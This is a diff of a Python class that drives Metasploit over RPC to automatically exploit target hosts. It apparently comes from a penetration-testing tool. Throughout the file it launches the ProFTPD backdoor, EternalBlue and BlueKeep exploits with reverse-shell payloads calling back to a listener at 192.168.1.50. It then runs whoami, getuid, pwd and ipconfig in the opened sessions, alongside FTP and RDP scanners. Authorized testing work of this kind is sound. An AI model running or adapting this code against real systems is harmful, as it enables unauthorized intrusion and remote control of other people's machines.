@@ -16,69 +16,88 @@ import time
 LHOSTIP = '192.168.1.50'
 
 
-# Inputs: Exploit, Target, Port
+# Inputs: Exploit, Target, Port (Target Port)
 
 class MetasploitInterface:
 
-    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, target, exploit):
+    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass): # Just for metasploit connection
         self.metasploit_ip = metasploit_ip
         self.metasploit_port = metasploit_port
         self.metasploit_pass = metasploit_pass
-        self.target = target
-        self.exploit = exploit
-
+        self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
+        print(self.client)
     
-    def connectMetasploit(self):
-        client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
-        print(f"Client Connected {client}")
-        return client
+    # def connectMetasploit(self):
+    #     client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
+    #     print(f"Client Connected {client}")
+    #     return client
 
-    def exploitFTP(self):
+    def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
+        
+        # switch statement to select exploit
+        if(exploit == 'auxiliary/scanner/ftp/anonymous'):
+            success, user_level, exploit = self.scanFTP(target, exploit, port)
+
+        elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
+            success, user_level, exploit = self.exploitFTP(target, exploit, port)
+
+        elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
+            success, user_level, exploit = self.eternalBlue(target, exploit, port)
+
+        elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
+            success, user_level, exploit = self.rdpScanner(target, exploit, port)
+        
+        else:
+            print("No function picked")
+        
+        return success, user_level, exploit
+
+    def exploitFTP(self, target, exploit, port):
         """ SETS UP THE MSFRPC API CLIENT"""
         
-        client = self.connectMetasploit()
-        split_string = self.exploit.split('/')
-        original_exploit = self.exploit ## obtains the full original exploit string for return
+        split_string = exploit.split('/')
+        original_exploit = exploit ## obtains the full original exploit string for return
 
         module = split_string[0]
         specific_module = "/".join(split_string[1:])
         
         """ SETS UP EXPLOIT and TARGET"""
-        exploit = client.modules.use(module, specific_module)
-        print(exploit.missing_required)
-        exploit["RHOSTS"] = self.target
-    
+        exploit = self.client.modules.use(module, specific_module)
+        # print(exploit.missing_required)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+     
         """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
-        payload = client.modules.use('payload', 'cmd/unix/reverse')
+        payload = self.client.modules.use('payload', 'cmd/unix/reverse')
         
         payload['LHOST'] = LHOSTIP
         
         """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT results"""
-        cid = client.consoles.console().cid
+        cid = self.client.consoles.console().cid
         try:
-            sid_before = list(client.sessions.list.keys())[-1]
-            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
-            sid_after = list(client.sessions.list.keys())[-1]
+            sid_before = list(self.client.sessions.list.keys())[-1]
+            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
+            sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError:
             sid_before = 0
-            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
+            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
             try:
-                sid_after = list(client.sessions.list.keys())[-1]
+                sid_after = list(self.client.sessions.list.keys())[-1]
             except IndexError:
                 print("No sessions on start and host not vulnerable")
                 sid_after = 0
         
         if(sid_before == sid_after):
-            print("SIDs DO MATCH - Did not work")
+            # print("SIDs DO MATCH - Did not work")
             print("There was an issue creating a session or the host is not vulnerable (see below): ")
             user_level = ""
             success = False
 
         else: 
             try:
-                print("SIDs DON'T MATCH - Worked")
-                shell = client.sessions.session(sid_after)
+                # print("SIDs DON'T MATCH - Worked")
+                shell = self.client.sessions.session(sid_after)
                 print("Exploit was successful! Here are the results: ")
                 shell.write('whoami')
                 user_level = shell.read()
@@ -96,29 +115,31 @@ class MetasploitInterface:
                 success = False
             
         
-        client.consoles.console(cid).destroy
+        self.client.consoles.console(cid).destroy
         
         ##print(exploit.targetpayloads())
         return success, user_level, original_exploit
         
     
-    def scanFTP(self):
+    def scanFTP(self, target, exploit, port):
         """ SETS UP THE MSFRPC API CLIENT"""
-        client = self.connectMetasploit()
-        original_exploit = self.exploit ## obtains the full exploit for return
+        
+        original_exploit = exploit ## obtains the full exploit for return
 
-        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
+        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
         
         """ SETS UP EXPLOIT and TARGET"""
         module = split_string[0]
         specific_module = "/".join(split_string[1:])
 
-        exploit = client.modules.use(module, specific_module)
+        exploit = self.client.modules.use(module, specific_module)
         # print(exploit.missing_required)
-        exploit["RHOSTS"] = self.target
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
 
-        cid = client.consoles.console().cid
-        results = client.consoles.console(cid).run_module_with_output(exploit)
+        cid = self.client.consoles.console().cid
+        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        print(results)
        
         if "Anonymous READ" in results:
             success = True
@@ -130,33 +151,34 @@ class MetasploitInterface:
         return success, user_level, original_exploit
 
 
-    def eternalBlue(self):
-        client = self.connectMetasploit()
-        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
-        original_exploit = self.exploit
+    def eternalBlue(self, target, exploit, port):
+
+        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
+        original_exploit = exploit
 
         module = split_string[0]
         specific_module = "/".join(split_string[1:])
 
         """ SETS UP EXPLOIT and TARGET"""
-        exploit = client.modules.use(module, specific_module)
-        exploit["RHOSTS"] = self.target
-        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+        exploit = self.client.modules.use(module, specific_module)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
+        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
         payload['LHOST'] = LHOSTIP
         payload['LPORT'] = 5557
         
         """ Creates and Executes Exploit & Prints out shell results from target"""
-        cid = client.consoles.console().cid
+        cid = self.client.consoles.console().cid
         try:
-            sid_before = list(client.sessions.list.keys())[-1]
-            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
-            sid_after = list(client.sessions.list.keys())[-1]
+            sid_before = list(self.client.sessions.list.keys())[-1]
+            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
+            sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError:
             sid_before = 0
-            print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
+            print(self.client.consoles.console(cid).run_module_with_output(exploit, payload=payload))
             try:
-                sid_after = list(client.sessions.list.keys())[-1]
+                sid_after = list(self.client.sessions.list.keys())[-1]
             except IndexError:
                 print("No sessions on start and host not vulnerable")
                 sid_after = 0
@@ -164,23 +186,29 @@ class MetasploitInterface:
         if(sid_before == sid_after):
             print("SIDs DO MATCH - Did not work")
             print("There was an issue creating a session or the host is not vulnerable (see below): ")
-            user_level = "No access"
+            user_level = ""
             success = False
            
         else:
             try:
-                shell = client.sessions.session(sid_after)
-                print(sid_after)
-                shell.write('echo %USERDOMAIN%\%USERNAME%')
-                time.sleep(3)
-                user_level = shell.read()
+                shell = self.client.sessions.session(sid_after)
+                # print(sid_after)
+                # shell.write('shell')
+                # time.sleep(3)
+                # print("Arrived at getuid command")
+                user_level = shell.run_with_output("getuid")
+                
+                user_level = user_level.split(":")[1].lstrip()
                 print("User Level: " + user_level)
-                shell.write('pwd')
-                time.sleep(3)
-                print(f"Directory Location: {shell.read()}")
-                shell.write('ipconfig')
-                time.sleep(3)
-                print(f"Address Properties:\n {shell.read()}")
+
+                directory = shell.run_with_output('pwd')
+                # print("Got to pwd command")
+
+                print("Directory Location: " + directory)
+                properties = shell.run_with_output('ipconfig')
+                # time.sleep(1)
+            
+                print(f"Address Properties:\n" + properties)
                 success = True
             
             except Exception as e:
@@ -188,26 +216,28 @@ class MetasploitInterface:
                 user_level = "No access"
                 success = False
         
-        client.consoles.console(cid).destroy
+        self.client.consoles.console(cid).destroy
 
         return success, user_level, original_exploit
 
-    def rdpScanner(self):
-        client = self.connectMetasploit()
-        original_exploit = self.exploit
+    def rdpScanner(self, target, exploit, port):
+        
+        original_exploit = exploit
 
-        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
+        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
         module = split_string[0]
         specific_module = "/".join(split_string[1:])
 
         """ SETS UP EXPLOIT and TARGET"""
-        exploit = client.modules.use(module, specific_module)
-        print(exploit.missing_required)
-        exploit["RHOSTS"] = self.target
+        exploit = self.client.modules.use(module, specific_module)
+        # print(exploit.missing_required)
+        exploit["RHOSTS"] = target
+        exploit["RPORT"] = port
         # exploit["LHOST"] = LHOSTIP
 
-        cid = client.consoles.console().cid
-        results = client.consoles.console(cid).run_module_with_output(exploit)
+        cid = self.client.consoles.console().cid
+        results = self.client.consoles.console(cid).run_module_with_output(exploit)
+        print(results)
         if "Detected" in results:
             success = True
             user_level = ""
@@ -217,35 +247,35 @@ class MetasploitInterface:
 
         return success, user_level, original_exploit
 
-    def blueKeep(self):
-        client = self.connectMetasploit()
-        original_exploit = self.exploit
+    def blueKeep(self, target, exploit, port):
+       
+        original_exploit = exploit
 
-        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly
+        split_string = exploit.split('/') ## SPLIT ON / and rejoin accordingly
 
         module = split_string[0]
         specific_module = "/".join(split_string[1:])
 
         """ SETS UP EXPLOIT and TARGET"""
-        exploit = client.modules.use(module, specific_module)
+        exploit = self.client.modules.use(module, specific_module)
         
         print(exploit.missing_required)
-        exploit["RHOSTS"] = self.target
+        exploit["RHOSTS"] = target
         exploit["fDisableCam"] = 0
         # exploit["TARGET"] = '7'
         # exploit["LHOST"] = LHOSTIP
 
-        cid = client.consoles.console().cid
+        cid = self.client.consoles.console().cid
         try:
-            sid_before = list(client.sessions.list.keys())[-1]
-            print(client.consoles.console(cid).run_module_with_output(exploit))
-            sid_after = list(client.sessions.list.keys())[-1]
+            sid_before = list(self.client.sessions.list.keys())[-1]
+            print(self.client.consoles.console(cid).run_module_with_output(exploit))
+            sid_after = list(self.client.sessions.list.keys())[-1]
 
         except IndexError:
             sid_before = 0
-            print(client.consoles.console(cid).run_module_with_output(exploit))
+            print(self.client.consoles.console(cid).run_module_with_output(exploit))
             try:
-                sid_after = list(client.sessions.list.keys())[-1]
+                sid_after = list(self.client.sessions.list.keys())[-1]
             except IndexError:
                 print("No sessions on start and host not vulnerable")
                 sid_after = 0
@@ -258,7 +288,7 @@ class MetasploitInterface:
            
         else:
             try:
-                shell = client.sessions.session(sid_after)
+                shell = self.client.sessions.session(sid_after)
                 print(sid_after)
                 shell.write('echo %USERDOMAIN%\%USERNAME%')
                 time.sleep(3)
@@ -277,12 +307,12 @@ class MetasploitInterface:
                 user_level = "No access"
                 success = False
         
-        client.consoles.console(cid).destroy
+        self.client.consoles.console(cid).destroy
 
         return success, user_level, original_exploit
-        # print(client.consoles.console(cid).run_module_with_output(exploit))
-   
+        # print(self.client.consoles.console(cid).run_module_with_output(exploit))
+
 
 # functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]
 
-# Outputs: 
+# Outputs:
